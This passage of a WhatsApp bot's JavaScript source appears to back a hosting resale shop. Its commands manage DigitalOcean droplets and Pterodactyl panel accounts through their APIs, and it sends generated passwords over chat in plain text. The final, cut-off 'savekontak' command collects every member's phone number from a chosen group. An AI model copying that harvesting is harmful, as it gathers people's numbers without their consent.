await gisnaxd.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
gisnaxd.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
gisnaxd.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cvps": {
if (!text) return m.reply(example("hostname"))
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await gisnaxd.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!text) return m.reply(example("skyzo,6283XXX"))
if (!args[1]) {
let list = []
let input
let d = text.split(",")
if (d.length > 1) {
input = text.split(",")[0] + ","
input += m.mentionedJid.length > 1 ? m.mentionedJid[0] : text.split(",")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
} else {
input = text
}
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1} ${input}`
})
}
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (Number(args[0]) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
let nomor
let usernem
let cc = args[1].split(',')
if (cc.length > 1) {
let [users, nom] = args[1].split(",")
if (!users || !nom) return m.reply(example("server username,nomor\n\nuntuk melihat server ketik *.listserver*\n\ncontoh *.1gb* 2 skyzo,6283XXX"))
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = args[1].toLowerCase()
nomor = m.chat
}

var onWa = await gisnaxd.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di whatsapp!")
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}

indx = Number(args[0] - 1)
let eggs = serverpanel[indx].egg
let nestids = serverpanel[indx].nestid
let locs = serverpanel[indx].loc
let domains = serverpanel[indx].domain
let apikeys = serverpanel[indx].apikey
let capikeys = serverpanel[indx].capikey

let username = usernem
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domains + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeys
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domains + `/api/application/nests/${nestids}/eggs/` + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeys
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domains + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeys,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggs),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locs)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await m.reply(`Akun panel *${capital(username)}* berhasil dibuat! data username dan password sudah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ Created :* ${user.created_at.split("T")[0]}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Masa aktif panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await gisnaxd.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return m.reply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.listadmin* 1"))
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (Number(text) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = `*── List admin panel server ${args[0]}*\n`
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await gisnaxd.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel": case "listp": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return m.reply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.listpanel* 2"))
if (Number(text) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply(`Tidak ada panel di server ${text}`)
let messageText = `*── List server panel pterodactyl server ${text}*\n`
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await gisnaxd.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return m.reply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.deladmin* 1"))
if (Number(text) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
if (!args[1]) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply(`Tidak ada admin panel di server ${text}`)
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${text} ${i.attributes.id}`
})
})
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: `List Admin Panel Server ${text}`, 
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[1] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}* di server panel ${args[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return m.reply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.delpanel* 1"))
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (Number(text) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
if (!args[1]) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply(`Tidak ada panel di server ${text}`)
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${text} ${s.id}`
})
}

return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: `List Panel Server ${text}`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(args[1]) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus panel *${capital(nameSrv)}* di server panel ${args[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await gisnaxd.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
